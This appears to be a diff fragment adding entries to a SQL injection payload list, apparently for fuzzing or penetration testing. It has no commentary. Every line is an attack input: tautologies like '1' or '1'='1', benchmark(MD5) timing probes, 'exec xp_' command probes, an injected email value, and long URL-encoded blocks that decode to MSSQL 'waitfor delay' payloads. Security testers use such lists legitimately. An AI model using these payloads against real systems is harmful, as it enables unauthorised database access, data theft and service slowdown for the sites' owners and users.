+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+1or1=1
+1'or'1'='1
+fake@ema'or'il.nl'='il.nl
+%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%29%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%27%29%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%27%29%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D%0A%22%29%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A%0A%22%29%29%29%29%29%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+1%271%0A1+exec+sp_+%28or+exec+xp_%29%0A1+and+1%3D1%0A1%27+and+1%3D%28select+count%28*%29+from+tablenames%29%3B+--%0A1+or+1%3D1%0A1%27+or+%271%27%3D%271%0A1or1%3D1%0A1%27or%271%27%3D%271%0Afake%40ema%27or%27il.nl%27%3D%27il.nl
